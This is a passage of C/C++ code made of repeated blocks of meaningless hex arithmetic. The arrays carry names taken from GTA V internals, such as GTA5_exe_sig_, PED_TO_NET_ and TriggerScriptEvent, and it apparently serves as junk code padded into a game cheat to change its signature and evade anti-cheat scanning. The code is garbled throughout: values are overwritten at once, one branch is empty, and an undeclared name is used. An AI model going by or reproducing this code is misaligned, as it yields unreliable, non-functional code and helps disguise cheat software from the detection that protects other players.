			offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = ponteiro * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
		offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (matriz[1] > aaaaaa)
		{
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		a = 0.0f;
		b = 0.0f;
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = 0xB2 * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
		matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
		matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		if (matriz[1] > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		a = 0.0f;
		b = 0.0f;
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
		GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (5) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		a = 0.0f;
		b = 0.0f;
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
		TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		for (int i = 1; i <= NumeroDeItens; i++)
		{
			char buffer[5000];
